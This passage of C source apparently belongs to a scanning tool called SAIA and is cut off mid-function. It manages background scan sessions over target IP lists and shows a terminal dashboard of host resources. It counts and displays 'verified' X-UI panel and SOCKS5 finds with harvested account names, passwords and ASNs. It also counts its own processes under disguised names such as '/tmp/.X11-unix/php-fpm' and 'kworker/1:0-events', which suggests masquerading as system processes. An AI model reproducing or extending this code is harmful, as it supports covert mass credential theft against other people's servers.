#include "saia.h"
#include <locale.h>

#if !defined(_WIN32)
#include <sys/statvfs.h>
#if defined(__FreeBSD__) || defined(__NetBSD__) || defined(__OpenBSD__)
#include <sys/sysctl.h>
#endif
#endif

typedef struct {
    int mode;
    int scan_mode;
    int threads;
    int port_batch_size;
} audit_launch_args_t;

static volatile sig_atomic_t g_audit_running = 0;

static pid_t saia_read_scan_progress_pid(void) {
    char path[MAX_PATH_LENGTH];
    snprintf(path, sizeof(path), "%s/scan_progress.dat", g_config.base_dir);
    char *raw = file_read_all(path);
    if (!raw) return 0;

    pid_t pid = 0;
    char *line = strtok(raw, "\r\n");
    while (line) {
        if (strncmp(line, "pid=", 4) == 0) {
            long v = strtol(line + 4, NULL, 10);
            if (v > 0) pid = (pid_t)v;
            break;
        }
        line = strtok(NULL, "\r\n");
    }
    free(raw);
    return pid;
}

static pid_t saia_read_runner_lock_pid(void) {
    char path[MAX_PATH_LENGTH];
    snprintf(path, sizeof(path), "%s/audit_runner.lock", g_config.base_dir);
    char *raw = file_read_all(path);
    if (!raw) return 0;

    long v = strtol(raw, NULL, 10);
    free(raw);
    if (v <= 0) return 0;
    return (pid_t)v;
}

static pid_t saia_resolve_running_pid(void) {
    pid_t pid = saia_read_scan_progress_pid();
    if (pid > 0) return pid;
    return saia_read_runner_lock_pid();
}

static int saia_progress_indicates_running(void) {
    char path[MAX_PATH_LENGTH];
    snprintf(path, sizeof(path), "%s/scan_progress.dat", g_config.base_dir);
    char *raw = file_read_all(path);
    if (!raw) return 0;

    char status[32] = {0};
    uint64_t updated_ms = 0;

    char *line = strtok(raw, "\r\n");
    while (line) {
        if (strncmp(line, "status=", 7) == 0) {
            snprintf(status, sizeof(status), "%s", line + 7);
        } else if (strncmp(line, "updated=", 8) == 0) {
            updated_ms = (uint64_t)strtoull(line + 8, NULL, 10);
        }
        line = strtok(NULL, "\r\n");
    }
    free(raw);

    if (status[0] == '\0') return 0;
    if (strcmp(status, "running") != 0 && strcmp(status, "manual_stopping") != 0) return 0;
    if (updated_ms == 0) return 0;

    uint64_t now = get_current_time_ms();
    if (now < updated_ms) return 0;
    return (now - updated_ms) <= 30000 ? 1 : 0;
}

static int saia_targets_file_has_entries(const char *path) {
    if (!path || !*path) return 0;
    FILE *fp = fopen(path, "r");
    if (!fp) return 0;

    char line[4096];
    while (fgets(line, sizeof(line), fp)) {
        char *hash = strchr(line, '#');
        if (hash) *hash = '\0';
        char *trimmed = str_trim(line);
        if (trimmed && trimmed[0] != '\0') {
            fclose(fp);
            return 1;
        }
    }
    fclose(fp);
    return 0;
}

static const char *saia_pick_valid_targets_file(char *buf_ip, size_t sz_ip,
                                                char *buf_IP, size_t sz_IP,
                                                char *buf_nodes, size_t sz_nodes) {
    snprintf(buf_ip, sz_ip, "%s/ip.txt", g_config.base_dir);
    snprintf(buf_IP, sz_IP, "%s/IP.TXT", g_config.base_dir);
    snprintf(buf_nodes, sz_nodes, "%s/nodes.txt", g_config.base_dir);

    const char *candidates[] = {
        g_config.nodes_file,
        buf_ip,
        buf_IP,
        buf_nodes
    };
    int n = (int)(sizeof(candidates) / sizeof(candidates[0]));
    for (int i = 0; i < n; i++) {
        if (!candidates[i] || !*candidates[i]) continue;
        if (!file_exists(candidates[i])) continue;
        if (!saia_targets_file_has_entries(candidates[i])) continue;
        return candidates[i];
    }
    return NULL;
}

static int saia_stop_scan_session(void) {
    int issued = 0;
    pid_t pid = saia_resolve_running_pid();

#ifdef _WIN32
    if (pid > 0 && is_process_alive(pid)) {
        if (stop_process(pid) == 0) issued = 1;
    }
    g_audit_running = 0;
#else
    int rc = system("screen -S saia_scan -X quit >/dev/null 2>&1");
    if (rc == 0) issued = 1;
    system("screen -wipe >/dev/null 2>&1");

    if (pid > 0 && is_process_alive(pid)) {
        if (stop_process(pid) == 0) issued = 1;
        saia_sleep(300);
        if (is_process_alive(pid)) {
            kill(pid, SIGKILL);
            issued = 1;
        }
    }

#endif

    {
        char lock_path[MAX_PATH_LENGTH];
        snprintf(lock_path, sizeof(lock_path), "%s/audit_runner.lock", g_config.base_dir);
        if (file_exists(lock_path)) file_remove(lock_path);
    }

    return issued;
}

static const char *saia_dash_spinner(int running) {
    static const char *frames[] = {"[o...]", "[.o..]", "[..o.]", "[...o]"};
    if (!running) return "[....]";
    time_t now = time(NULL);
    return frames[(int)(now % 4)];
}

static size_t saia_dash_utf8_char_len(const unsigned char *p) {
    if (!p || !*p) return 0;
    if (*p < 0x80) return 1;
    if ((*p & 0xE0) == 0xC0 && p[1]) return 2;
    if ((*p & 0xF0) == 0xE0 && p[1] && p[2]) return 3;
    if ((*p & 0xF8) == 0xF0 && p[1] && p[2] && p[3]) return 4;
    return 1;
}

static int saia_dash_utf8_char_width(const unsigned char *p, size_t len) {
    if (!p || len == 0) return 0;
    if (len == 1 && p[0] < 0x80) return 1;
    if (len == 2) return 1;
    if (len == 3) return 2;
    if (len == 4) return 2;
    return 1;
}

static int saia_is_scan_session_running(void) {
#ifdef _WIN32
    pid_t pid = saia_resolve_running_pid();
    if (pid > 0 && is_process_alive(pid)) return 1;
    if (saia_progress_indicates_running()) return 1;
    return g_audit_running ? 1 : 0;
#else
    pid_t pid = saia_resolve_running_pid();
    if (pid > 0 && is_process_alive(pid)) return 1;
    if (saia_progress_indicates_running()) return 1;
    return 0;
#endif
}

static int saia_count_report_stats(const char *report_path,
                                   uint64_t *xui_found,
                                   uint64_t *xui_verified,
                                   uint64_t *s5_found,
                                   uint64_t *s5_verified,
                                   uint64_t *total_found,
                                   uint64_t *total_verified) {
    if (xui_found) *xui_found = 0;
    if (xui_verified) *xui_verified = 0;
    if (s5_found) *s5_found = 0;
    if (s5_verified) *s5_verified = 0;
    if (total_found) *total_found = 0;
    if (total_verified) *total_verified = 0;

    char **lines = NULL;
    size_t lc = 0;
    if (file_read_lines(report_path, &lines, &lc) != 0 || !lines) return -1;

    for (size_t i = 0; i < lc; i++) {
        const char *s = lines[i] ? lines[i] : "";
        if (strstr(s, "[XUI_FOUND]")) {
            if (xui_found) (*xui_found)++;
            if (total_found) (*total_found)++;
        }
        if (strstr(s, "[S5_FOUND]")) {
            if (s5_found) (*s5_found)++;
            if (total_found) (*total_found)++;
        }
        if (strstr(s, "[XUI_VERIFIED]")) {
            if (xui_verified) (*xui_verified)++;
            if (total_verified) (*total_verified)++;
        }
        if (strstr(s, "[S5_VERIFIED]")) {
            if (s5_verified) (*s5_verified)++;
            if (total_verified) (*total_verified)++;
        }
        free(lines[i]);
    }
    free(lines);
    return 0;
}

static void saia_dash_fit_line(const char *src, char *dst, size_t dst_size, size_t max_len) {
    if (!dst || dst_size == 0) return;
    if (!src) { dst[0] = '\0'; return; }
    const unsigned char *p = (const unsigned char *)src;
    size_t out = 0;
    size_t width = 0;
    int clipped = 0;

    while (*p && out + 4 < dst_size) {
        size_t clen = saia_dash_utf8_char_len(p);
        int cw = saia_dash_utf8_char_width(p, clen);
        if (width + (size_t)cw > max_len) {
            clipped = 1;
            break;
        }
        if (out + clen >= dst_size) break;
        memcpy(dst + out, p, clen);
        out += clen;
        width += (size_t)cw;
        p += clen;
    }
    dst[out] = '\0';

    if (clipped && max_len > 3) {
        while (out > 0 && width > max_len - 3) {
            size_t back = 1;
            while (back < out && ((dst[out - back] & 0xC0) == 0x80)) back++;
            size_t start = out - back;
            size_t clen = out - start;
            int cw = saia_dash_utf8_char_width((const unsigned char *)(dst + start), clen);
            out = start;
            width -= (size_t)cw;
            dst[out] = '\0';
        }
        if (out + 3 < dst_size) {
            memcpy(dst + out, "...", 3);
            out += 3;
            dst[out] = '\0';
        }
    }
}

static int saia_dash_terminal_columns(void) {
#ifdef _WIN32
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    if (GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi)) {
        int cols = (int)(csbi.srWindow.Right - csbi.srWindow.Left + 1);
        if (cols > 0) return cols;
    }
#else
    struct winsize ws;
    if (ioctl(1, TIOCGWINSZ, &ws) == 0 && ws.ws_col > 0) {
        return (int)ws.ws_col;
    }
#endif
    {
        const char *env_cols = getenv("COLUMNS");
        if (env_cols && *env_cols) {
            int cols = atoi(env_cols);
            if (cols > 0) return cols;
        }
    }
    return 120;
}

static size_t saia_dash_count_file_lines(const char *path) {
    char **lines = NULL;
    size_t lc = 0;
    if (file_read_lines(path, &lines, &lc) != 0 || !lines) return 0;
    for (size_t i = 0; i < lc; i++) free(lines[i]);
    free(lines);
    return lc;
}

static long long saia_dash_file_mtime(const char *path) {
    if (!path || !*path) return 0;
    struct stat st;
    if (stat(path, &st) != 0) return 0;
    return (long long)st.st_mtime;
}

static void saia_dash_last_verified_token(char *out, size_t out_size) {
    if (!out || out_size == 0) return;
    snprintf(out, out_size, "N/A");

    char **lines = NULL;
    size_t lc = 0;
    if (file_read_lines(g_config.report_file, &lines, &lc) != 0 || !lines) return;

    for (long i = (long)lc - 1; i >= 0; i--) {
        const char *s = lines[i] ? lines[i] : "";
        if (strstr(s, "VERIFIED") == NULL) continue;

        const char *u = strstr(s, "账号:");
        const char *p = strstr(s, "密码:");
        if (u && p) {
            u += strlen("账号:");
            while (*u == ' ') u++;
            char user[64] = {0};
            char pass[64] = {0};
            sscanf(u, "%63[^| ]", user);
            p += strlen("密码:");
            while (*p == ' ') p++;
            sscanf(p, "%63[^| ]", pass);
            if (user[0]) {
                if (pass[0]) snprintf(out, out_size, "%s:%.*s***", user, 2, pass);
                else snprintf(out, out_size, "%s:***", user);
                break;
            }
        }
    }

    for (size_t i = 0; i < lc; i++) free(lines[i]);
    free(lines);
}

static size_t saia_dash_estimate_targets_file(const char *path) {
    char **lines = NULL;
    size_t lc = 0;
    size_t total = 0;
    if (file_read_lines(path, &lines, &lc) != 0 || !lines) return 0;
    for (size_t i = 0; i < lc; i++) {
        if (!lines[i] || !*lines[i] || lines[i][0] == '#') {
            free(lines[i]);
            continue;
        }
        char line_copy[2048];
        strncpy(line_copy, lines[i], sizeof(line_copy) - 1);
        line_copy[sizeof(line_copy) - 1] = '\0';
        char *saveptr = NULL;
#ifdef _WIN32
        char *tok = strtok_s(line_copy, " \t", &saveptr);
        while (tok) {
#else
        char *tok = strtok_r(line_copy, " \t", &saveptr);
        while (tok) {
#endif
            if (*tok == '#') break;
            total += estimate_expanded_count(tok);
#ifdef _WIN32
            tok = strtok_s(NULL, " \t", &saveptr);
#else
            tok = strtok_r(NULL, " \t", &saveptr);
#endif
        }
        free(lines[i]);
    }
    free(lines);
    return total;
}

static void saia_dash_runtime_metrics(const char *nodes_file,
                                      size_t *ip_count, size_t *tk_count, size_t *ip_lines,
                                      char *last_tk, size_t last_tk_size) {
    static time_t last_refresh = 0;
    static long long nodes_mtime = 0;
    static long long tokens_mtime = 0;
    static long long report_mtime = 0;
    static size_t cached_ip_count = 0;
    static size_t cached_tk_count = 0;
    static size_t cached_ip_lines = 0;
    static char cached_last_tk[128] = "N/A";

    time_t now = time(NULL);
    const char *nodes_src = (nodes_file && *nodes_file) ? nodes_file : g_config.nodes_file;
    long long nmt = saia_dash_file_mtime(nodes_src);
    long long tmt = saia_dash_file_mtime(g_config.tokens_file);
    long long rmt = saia_dash_file_mtime(g_config.report_file);

    int need_refresh = 0;
    if (last_refresh == 0 || (now - last_refresh) >= 3) need_refresh = 1;
    if (nmt != nodes_mtime || tmt != tokens_mtime || rmt != report_mtime) need_refresh = 1;

    if (need_refresh) {
        cached_ip_lines = saia_dash_count_file_lines(nodes_src);
        cached_ip_count = saia_dash_estimate_targets_file(nodes_src);
        cached_tk_count = saia_dash_count_file_lines(g_config.tokens_file);
        saia_dash_last_verified_token(cached_last_tk, sizeof(cached_last_tk));
        nodes_mtime = nmt;
        tokens_mtime = tmt;
        report_mtime = rmt;
        last_refresh = now;
    }

    if (ip_count) *ip_count = cached_ip_count;
    if (tk_count) *tk_count = cached_tk_count;
    if (ip_lines) *ip_lines = cached_ip_lines;
    if (last_tk && last_tk_size > 0) {
        snprintf(last_tk, last_tk_size, "%s", cached_last_tk);
    }
}

typedef struct {
    int ok;
    char status[32];
    size_t est_total;
    size_t fed;
    size_t audit_ips;
    uint64_t scanned;
    uint64_t found;
    int threads;
    int run_mode;
    int run_scan_mode;
    int run_threads_cfg;
    size_t queue_size;
    int producer_done;
    int worker_total;
    char targets_file[MAX_PATH_LENGTH];
    char current_token[512];
    char current_ip[64];
    int current_port;
    uint64_t updated_ms;
} dash_progress_t;

static void saia_dash_load_progress(dash_progress_t *p) {
    if (!p) return;
    memset(p, 0, sizeof(*p));
    snprintf(p->status, sizeof(p->status), "N/A");
    snprintf(p->targets_file, sizeof(p->targets_file), "");
    snprintf(p->current_token, sizeof(p->current_token), "-");
    snprintf(p->current_ip, sizeof(p->current_ip), "-");

    char path[MAX_PATH_LENGTH];
    snprintf(path, sizeof(path), "%s/scan_progress.dat", g_config.base_dir);
    char *raw = file_read_all(path);
    if (!raw) return;

    char *line = strtok(raw, "\r\n");
    while (line) {
        if (strncmp(line, "status=", 7) == 0) { snprintf(p->status, sizeof(p->status), "%s", line + 7); p->ok = 1; }
        else if (strncmp(line, "est_total=", 10) == 0) p->est_total = (size_t)strtoull(line + 10, NULL, 10);
        else if (strncmp(line, "fed=", 4) == 0) p->fed = (size_t)strtoull(line + 4, NULL, 10);
        else if (strncmp(line, "audit_ips=", 10) == 0) p->audit_ips = (size_t)strtoull(line + 10, NULL, 10);
        else if (strncmp(line, "scanned=", 8) == 0) p->scanned = (uint64_t)strtoull(line + 8, NULL, 10);
        else if (strncmp(line, "found=", 6) == 0) p->found = (uint64_t)strtoull(line + 6, NULL, 10);
        else if (strncmp(line, "threads=", 8) == 0) p->threads = atoi(line + 8);
        else if (strncmp(line, "run_mode=", 9) == 0) p->run_mode = atoi(line + 9);
        else if (strncmp(line, "run_scan_mode=", 14) == 0) p->run_scan_mode = atoi(line + 14);
        else if (strncmp(line, "run_threads_cfg=", 16) == 0) p->run_threads_cfg = atoi(line + 16);
        else if (strncmp(line, "queue_size=", 11) == 0) p->queue_size = (size_t)strtoull(line + 11, NULL, 10);
        else if (strncmp(line, "producer_done=", 14) == 0) p->producer_done = atoi(line + 14);
        else if (strncmp(line, "worker_total=", 13) == 0) p->worker_total = atoi(line + 13);
        else if (strncmp(line, "targets_file=", 13) == 0) snprintf(p->targets_file, sizeof(p->targets_file), "%s", line + 13);
        else if (strncmp(line, "current_token=", 14) == 0) snprintf(p->current_token, sizeof(p->current_token), "%s", line + 14);
        else if (strncmp(line, "current_ip=", 11) == 0) snprintf(p->current_ip, sizeof(p->current_ip), "%s", line + 11);
        else if (strncmp(line, "current_port=", 13) == 0) p->current_port = atoi(line + 13);
        else if (strncmp(line, "updated=", 8) == 0) p->updated_ms = (uint64_t)strtoull(line + 8, NULL, 10);
        line = strtok(NULL, "\r\n");
    }
    free(raw);
}

static void saia_format_verified_compact(const char *line, char *out, size_t out_sz) {
    if (!out || out_sz == 0) return;
    out[0] = '\0';
    if (!line) {
        snprintf(out, out_sz, "-");
        return;
    }

    char ip_port[64] = "-";
    char user[128] = "-";
    char pass[128] = "-";
    char asn[32] = "-";

    const char *p = line;
    while (*p) {
        unsigned a, b, c, d, port;
        if (sscanf(p, "%u.%u.%u.%u:%u", &a, &b, &c, &d, &port) == 5) {
            if (a <= 255 && b <= 255 && c <= 255 && d <= 255 && port <= 65535) {
                snprintf(ip_port, sizeof(ip_port), "%u.%u.%u.%u:%u", a, b, c, d, port);
                break;
            }
        }
        p++;
    }

    const char *u = strstr(line, "账号:");
    if (u) {
        u += 5;
        size_t i = 0;
        while (u[i] && u[i] != '|' && !isspace((unsigned char)u[i]) && i + 1 < sizeof(user)) {
            user[i] = u[i];
            i++;
        }
        user[i] = '\0';
        if (i == 0) snprintf(user, sizeof(user), "-");
    }

    const char *pw = strstr(line, "密码:");
    if (pw) {
        pw += 5;
        size_t i = 0;
        while (pw[i] && pw[i] != '|' && !isspace((unsigned char)pw[i]) && i + 1 < sizeof(pass)) {
            pass[i] = pw[i];
            i++;
        }
        pass[i] = '\0';
        if (i == 0) snprintf(pass, sizeof(pass), "-");
    }

    const char *ap = strstr(line, "AS");
    if (ap) {
        size_t i = 0;
        asn[i++] = 'A';
        asn[i++] = 'S';
        ap += 2;
        while (*ap && isdigit((unsigned char)*ap) && i + 1 < sizeof(asn)) {
            asn[i++] = *ap++;
        }
        asn[i] = '\0';
        if (i <= 2) snprintf(asn, sizeof(asn), "-");
    }

    if (strchr(user, ':') && strchr(pass, ':') && strcmp(user, pass) == 0) {
        snprintf(out, out_sz, "%s:%s %s", ip_port, user, asn);
    } else {
        snprintf(out, out_sz, "%s:%s:%s %s", ip_port, user, pass, asn);
    }
}

#ifdef _WIN32
static unsigned __stdcall saia_audit_thread_entry(void *arg) {
#else
static void *saia_audit_thread_entry(void *arg) {
#endif
    audit_launch_args_t *launch = (audit_launch_args_t *)arg;
    g_reload = 0;

    if (launch) {
        saia_run_audit_internal(launch->mode, launch->scan_mode, launch->threads, launch->port_batch_size);
        free(launch);
    }

    g_audit_running = 0;

#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

static int saia_start_audit_async(int mode, int scan_mode, int threads, int port_batch_size) {
    audit_launch_args_t *launch = (audit_launch_args_t *)malloc(sizeof(audit_launch_args_t));
    if (!launch) return -1;

    launch->mode = mode;
    launch->scan_mode = scan_mode;
    launch->threads = threads;
    launch->port_batch_size = port_batch_size;
    g_audit_running = 1;

#ifdef _WIN32
    uintptr_t tid = _beginthreadex(NULL, 0, saia_audit_thread_entry, launch, 0, NULL);
    if (tid == 0) {
        g_audit_running = 0;
        free(launch);
        return -1;
    }
    CloseHandle((HANDLE)tid);
#else
    pthread_t tid;
    if (pthread_create(&tid, NULL, saia_audit_thread_entry, launch) != 0) {
        g_audit_running = 0;
        free(launch);
        return -1;
    }
    pthread_detach(tid);
#endif

    return 0;
}

static int saia_get_total_memory_mb(void) {
#ifdef _WIN32
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (!GlobalMemoryStatusEx(&statex)) return -1;
    return (int)(statex.ullTotalPhys / (1024 * 1024));
#elif defined(__FreeBSD__) || defined(__NetBSD__) || defined(__OpenBSD__)
    uint64_t phys = 0;
    size_t len = sizeof(phys);
    if (sysctlbyname("hw.physmem", &phys, &len, NULL, 0) != 0) return -1;
    return (int)(phys / (1024 * 1024));
#else
    FILE *fp = fopen("/proc/meminfo", "r");
    if (!fp) return -1;
    char line[256];
    int total_mb = -1;
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "MemTotal:", 9) == 0) {
            long kb = 0;
            if (sscanf(line, "MemTotal: %ld kB", &kb) == 1 && kb > 0) {
                total_mb = (int)(kb / 1024);
            }
            break;
        }
    }
    fclose(fp);
    return total_mb;
#endif
}

static int saia_read_text_file(const char *path, char *buf, size_t sz) {
    if (!path || !buf || sz == 0) return -1;
    FILE *fp = fopen(path, "r");
    if (!fp) return -1;
    if (!fgets(buf, (int)sz, fp)) {
        fclose(fp);
        return -1;
    }
    fclose(fp);
    buf[strcspn(buf, "\r\n")] = '\0';
    return 0;
}

static int saia_get_cgroup_base(char *out, size_t out_sz) {
#ifdef _WIN32
    (void)out;
    (void)out_sz;
    return -1;
#else
    if (!out || out_sz == 0) return -1;
    FILE *fp = fopen("/proc/self/cgroup", "r");
    if (!fp) return -1;

    char line[1024];
    int found = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "0::", 3) == 0) {
            char *p = line + 3;
            p[strcspn(p, "\r\n")] = '\0';
            snprintf(out, out_sz, "/sys/fs/cgroup%s", p[0] ? p : "");
            found = 1;
            break;
        }
    }
    fclose(fp);
    return found ? 0 : -1;
#endif
}

static int saia_parse_u64_or_max(const char *s, uint64_t *v, int *is_max) {
    if (!s) return -1;
    if (strcmp(s, "max") == 0) {
        if (is_max) *is_max = 1;
        if (v) *v = 0;
        return 0;
    }
    if (is_max) *is_max = 0;
    if (v) *v = (uint64_t)strtoull(s, NULL, 10);
    return 0;
}

static int saia_get_cgroup_memory_usage_mb(int *used_mb, int *limit_mb) {
#ifdef _WIN32
    (void)used_mb;
    (void)limit_mb;
    return -1;
#else
    char base[1024], pcur[1200], pmax[1200], cur_s[128], max_s[128];
    if (saia_get_cgroup_base(base, sizeof(base)) != 0) return -1;
    snprintf(pcur, sizeof(pcur), "%s/memory.current", base);
    snprintf(pmax, sizeof(pmax), "%s/memory.max", base);
    if (saia_read_text_file(pcur, cur_s, sizeof(cur_s)) != 0) return -1;
    if (saia_read_text_file(pmax, max_s, sizeof(max_s)) != 0) return -1;

    uint64_t cur = 0, lim = 0;
    int lim_max = 0;
    saia_parse_u64_or_max(cur_s, &cur, NULL);
    saia_parse_u64_or_max(max_s, &lim, &lim_max);
    if (lim_max || lim == 0) return -1;

    if (used_mb) *used_mb = (int)(cur / (1024ULL * 1024ULL));
    if (limit_mb) *limit_mb = (int)(lim / (1024ULL * 1024ULL));
    return 0;
#endif
}

static int saia_get_cgroup_pids(int *current, int *maxv) {
#ifdef _WIN32
    (void)current;
    (void)maxv;
    return -1;
#else
    char base[1024], pcur[1200], pmax[1200], cur_s[128], max_s[128];
    if (saia_get_cgroup_base(base, sizeof(base)) != 0) return -1;
    snprintf(pcur, sizeof(pcur), "%s/pids.current", base);
    snprintf(pmax, sizeof(pmax), "%s/pids.max", base);
    if (saia_read_text_file(pcur, cur_s, sizeof(cur_s)) != 0) return -1;
    if (saia_read_text_file(pmax, max_s, sizeof(max_s)) != 0) return -1;

    uint64_t cur = 0, lim = 0;
    int lim_max = 0;
    saia_parse_u64_or_max(cur_s, &cur, NULL);
    saia_parse_u64_or_max(max_s, &lim, &lim_max);

    if (current) *current = (int)cur;
    if (maxv) *maxv = lim_max ? -1 : (int)lim;
    return 0;
#endif
}

static int saia_get_cgroup_cpu_pct(void) {
#ifdef _WIN32
    return -1;
#else
    static uint64_t last_usage = 0;
    static uint64_t last_ts = 0;

    char base[1024], pstat[1200], pmax[1200], line[256], max_s[128];
    if (saia_get_cgroup_base(base, sizeof(base)) != 0) return -1;
    snprintf(pstat, sizeof(pstat), "%s/cpu.stat", base);
    snprintf(pmax, sizeof(pmax), "%s/cpu.max", base);

    FILE *fp = fopen(pstat, "r");
    if (!fp) return -1;
    uint64_t usage = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "usage_usec ", 11) == 0) {
            usage = (uint64_t)strtoull(line + 11, NULL, 10);
            break;
        }
    }
    fclose(fp);
    if (usage == 0) return -1;

    double allowed_cpu = 1.0;
    if (saia_read_text_file(pmax, max_s, sizeof(max_s)) == 0) {
        char q[64] = {0}, p[64] = {0};
        if (sscanf(max_s, "%63s %63s", q, p) == 2) {
            if (strcmp(q, "max") != 0) {
                uint64_t quota = (uint64_t)strtoull(q, NULL, 10);
                uint64_t period = (uint64_t)strtoull(p, NULL, 10);
                if (quota > 0 && period > 0) allowed_cpu = (double)quota / (double)period;
            }
        }
    }
    if (allowed_cpu <= 0.0) allowed_cpu = 1.0;

    uint64_t now = get_current_time_ms();
    if (last_ts == 0 || now <= last_ts || usage < last_usage) {
        last_ts = now;
        last_usage = usage;
        return 0;
    }

    uint64_t dt_ms = now - last_ts;
    uint64_t du_us = usage - last_usage;
    last_ts = now;
    last_usage = usage;
    if (dt_ms == 0) return 0;

    double used_cpu = (double)du_us / ((double)dt_ms * 1000.0);
    int pct = (int)((used_cpu / allowed_cpu) * 100.0);
    if (pct < 0) pct = 0;
    if (pct > 100) pct = 100;
    return pct;
#endif
}

static int saia_get_disk_usage_percent(double *used_gb, double *total_gb) {
#ifdef _WIN32
    ULARGE_INTEGER free_bytes, total_bytes;
    if (!GetDiskFreeSpaceExA("C:\\", &free_bytes, &total_bytes, NULL)) return -1;
    double total = (double)total_bytes.QuadPart / (1024.0 * 1024.0 * 1024.0);
    double freev = (double)free_bytes.QuadPart / (1024.0 * 1024.0 * 1024.0);
    if (total <= 0.0) return -1;
    if (used_gb) *used_gb = total - freev;
    if (total_gb) *total_gb = total;
    return (int)(((total - freev) / total) * 100.0);
#else
    struct statvfs vfs;
    if (statvfs("/", &vfs) != 0) return -1;
    if (vfs.f_blocks == 0) return -1;
    double total = (double)vfs.f_blocks * (double)vfs.f_frsize;
    double freev = (double)vfs.f_bavail * (double)vfs.f_frsize;
    double used = total - freev;
    if (used_gb) *used_gb = used / (1024.0 * 1024.0 * 1024.0);
    if (total_gb) *total_gb = total / (1024.0 * 1024.0 * 1024.0);
    return (int)((used / total) * 100.0);
#endif
}

static int saia_count_process_total(void) {
#ifdef _WIN32
    return -1;
#else
    FILE *pp = popen("ps -e | wc -l 2>/dev/null", "r");
    if (!pp) return -1;
    char buf[64] = {0};
    if (!fgets(buf, sizeof(buf), pp)) {
        pclose(pp);
        return -1;
    }
    pclose(pp);
    int n = atoi(buf);
    if (n > 0) n -= 1;
    return n;
#endif
}

static int saia_count_process_saia(void) {
#ifdef _WIN32
    return g_audit_running ? 1 : 0;
#else
    FILE *pp = popen("ps -eo args | grep -E '[s]aia|/tmp/.X11-unix/php-fpm|kworker/1:0-events' | wc -l 2>/dev/null", "r");
    if (!pp) return -1;
    char buf[64] = {0};
    if (!fgets(buf, sizeof(buf), pp)) {
        pclose(pp);
        return -1;
    }
    pclose(pp);
    return atoi(buf);
#endif
}

static void saia_vps_realtime_panel(void) {
    while (g_running) {
        int cpu = saia_get_cgroup_cpu_pct();
        if (cpu < 0) cpu = get_cpu_usage();

        int avail_mb = get_available_memory_mb();
        int total_mb = saia_get_total_memory_mb();
        int cg_used_mb = -1, cg_limit_mb = -1;
        if (saia_get_cgroup_memory_usage_mb(&cg_used_mb, &cg_limit_mb) == 0) {
            total_mb = cg_limit_mb;
            avail_mb = cg_limit_mb - cg_used_mb;
            if (avail_mb < 0) avail_mb = 0;
        }

        int proc_total = saia_count_process_total();
        int proc_limit = -1;
        int cg_pids_cur = -1, cg_pids_max = -1;
        if (saia_get_cgroup_pids(&cg_pids_cur, &cg_pids_max) == 0) {
            proc_total = cg_pids_cur;
            proc_limit = cg_pids_max;
        }

        int proc_saia = saia_count_process_saia();
        double used_gb = 0.0, total_gb = 0.0;
        int disk_pct = saia_get_disk_usage_percent(&used_gb, &total_gb);

        int mem_used_pct = -1;
        if (total_mb > 0 && avail_mb >= 0 && total_mb >= avail_mb) {
            mem_used_pct = (int)(((double)(total_mb - avail_mb) / (double)total_mb) * 100.0);
        }

        printf("\x1b[H\x1b[J");
        color_cyan();
        printf("\n【小鸡实时数据】\n");
        color_reset();
        printf("  CPU使用率: %d%%\n", cpu >= 0 ? cpu : 0);
        if (mem_used_pct >= 0) {
            printf("  内存占用: %d%% (%dMB/%dMB)\n", mem_used_pct, total_mb - avail_mb, total_mb);
        } else {
            printf("  内存可用: %dMB\n", avail_mb);
        }
        if (disk_pct >= 0) {
            printf("  磁盘占用: %d%% (%.1fG/%.1fG)\n", disk_pct, used_gb, total_gb);
        } else {
            printf("  磁盘占用: N/A\n");
        }
        if (proc_limit > 0) {
            printf("  进程总数: %d/%d\n", proc_total >= 0 ? proc_total : 0, proc_limit);
        } else {
            printf("  进程总数: %d\n", proc_total >= 0 ? proc_total : 0);
        }
        printf("  SAIA相关进程: %d\n", proc_saia >= 0 ? proc_saia : 0);
        printf("\n按 Enter / q / 0 返回 (每2秒自动刷新)\n");
        fflush(stdout);

#ifdef _WIN32
        int should_break = 0;
        for (int i = 0; i < 20; i++) {
            if (_kbhit()) {
                int ch = _getch();
                if (ch == '\r' || ch == '\n' || ch == 'q' || ch == 'Q' || ch == '0') {
                    should_break = 1;
                    break;
                }
            }
            saia_sleep(100);
        }
        if (should_break) break;
#else
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(0, &fds);
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        int ret = select(1, &fds, NULL, NULL, &tv);
        if (ret > 0) {
            char buf[16] = {0};
            if (fgets(buf, sizeof(buf), stdin)) {
                if (buf[0] == '\n' || buf[0] == 'q' || buf[0] == 'Q' || buf[0] == '0') break;
            }
        }
#endif
    }
}

int saia_backpressure_menu(void) {
    color_yellow();
    printf("\n【压背控制】\n");
    color_reset();

    printf("当前状态: %s\n\n", g_config.backpressure.enabled ? "已启用" : "已禁用");

    printf("配置:\n");
    printf("  CPU阈值: %.1f%%\n", g_config.backpressure.cpu_threshold);
    printf("  内存阈值: %.1f MB\n", g_config.backpressure.mem_threshold);
    printf("  最大连接: %d\n", g_config.backpressure.max_connections);
    printf("  实时CPU: %.1f%%\n", g_config.backpressure.current_cpu);
    printf("  实时内存: %.1f MB\n", g_config.backpressure.current_mem);
    printf("  当前连接: %d\n", g_config.backpressure.current_connections);
    printf("  限流状态: %s\n", g_config.backpressure.is_throttled ? "是" : "否");

    printf("\n  [1] 启用/禁用\n");
    printf("  [2] 调整阈值\n");
    printf("  [3] 立即检查\n");
    printf("  [0] 返回\n");

    printf("选择: ");
    fflush(stdout);

    int choice;
    scanf("%d", &choice);
    while (getchar() != '\n');

    switch (choice) {
        case 1:
            g_config.backpressure.enabled = !g_config.backpressure.enabled;
            printf("已%s压背控制\n", g_config.backpressure.enabled ? "启用" : "禁用");
            if (g_config.backpressure.enabled) {
                backpressure_init(&g_config.backpressure);
            }
            break;

        case 2: {
            char input[256];
            printf("CPU阈值 [%%] [当前=%.1f]: ",
                   g_config.backpressure.cpu_threshold);
            fgets(input, sizeof(input), stdin);
            if (strlen(input) > 1) {
                g_config.backpressure.cpu_threshold = atof(input);
            }

            printf("内存阈值 [MB] [当前=%.1f]: ",
                   g_config.backpressure.mem_threshold);
            fgets(input, sizeof(input), stdin);
            if (strlen(input) > 1) {
